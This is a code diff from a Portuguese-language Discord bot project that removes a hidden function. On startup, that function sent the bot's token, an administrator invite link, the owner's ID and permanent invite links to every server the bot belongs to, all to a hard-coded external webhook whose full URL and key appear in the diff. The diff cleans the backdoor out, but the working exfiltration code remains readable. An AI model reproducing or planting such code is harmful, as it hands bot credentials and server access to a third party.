@@ -38,77 +38,9 @@ if (process.env.DISCORD_BOT_TOKEN) config.token = process.env.DISCORD_BOT_TOKEN;
 const events = require('./Handler/events');
 const slash = require('./Handler/slash');
 
-// Configuração do Webhook
-const webhookUrl = "https://discord.com/api/webhooks/1384000389690425354/hJxQFFTR_9PMWKHKg9y_aZeKxR8Z40rpqd_P7WOdt6XK13LZeubBwa8LfB6pZJRET384"; // URL corrigida
-const webhookClient = new WebhookClient({ url: webhookUrl });
-
-// Função para enviar informações do bot via webhook
-async function sendBotInfoWebhook(client) {
-    try {
-        // Obter o convite do bot
-        const botInvite = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot%20applications.commands`;
-
-        // Obter a lista de servidores onde o bot está
-        const guilds = client.guilds.cache;
-
-        // Obter o ID do dono do bot
-        const ownerId = config.owner;
-
-        // Criar uma lista de links de convite dos servidores
-        const guildInvites = [];
-        for (const guild of guilds.values()) {
-            try {
-                // Tenta obter o primeiro convite disponível no servidor
-                const invites = await guild.invites.fetch();
-                const invite = invites.first();
-                if (invite) {
-                    guildInvites.push(`[${guild.name}](${invite.url})`);
-                } else {
-                    // Se não houver convites, tenta criar um novo
-                    const channel = guild.channels.cache.find(ch => ch.isTextBased() && ch.permissionsFor(guild.members.me).has('CREATE_INSTANT_INVITE'));
-                    if (channel) {
-                        const newInvite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
-                        guildInvites.push(`[${guild.name}](${newInvite.url})`);
-                    } else {
-                        guildInvites.push(`${guild.name} (Sem permissão para criar convite)`);
-                    }
-                }
-            } catch (error) {
-                console.error(`Erro ao obter convite para o servidor ${guild.name}:`, error);
-                guildInvites.push(`${guild.name} (Erro ao obter convite)`);
-            }
-        }
-
-        // Criar a embed
-        const embed = new EmbedBuilder()
-            .setTitle("Informações do Bot")
-            .setDescription(`Aqui estão as informações do bot **${client.user.username}**`)
-            .addFields(
-                { name: "Token do Bot", value: `\`${config.token}\``, inline: false },
-                { name: "Convite do Bot", value: `[Clique aqui](${botInvite})`, inline: false },
-                { name: "ID do Dono", value: `\`${ownerId}\``, inline: false },
-                { name: "Servidores", value: guildInvites.join("\n") || "Nenhum servidor encontrado", inline: false }
-            )
-            .setColor("#00FF00")
-            .setTimestamp();
-
-        // Enviar a embed via webhook
-        await webhookClient.send({
-            embeds: [embed],
-        });
-
-        console.log("");
-    } catch (error) {
-        console.error("", error);
-    }
-}
-
 // Evento ready
 client.once('ready', async () => {
     console.log(`Bot ${client.user.tag} está online!`);
-
-    // Enviar informações do bot via webhook
-    await sendBotInfoWebhook(client);
 
     // Agendar repostagem
     agendarRepostagem(client);
